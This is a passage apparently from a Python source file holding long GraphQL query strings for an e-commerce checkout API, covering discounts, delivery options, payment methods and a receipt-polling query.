currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode 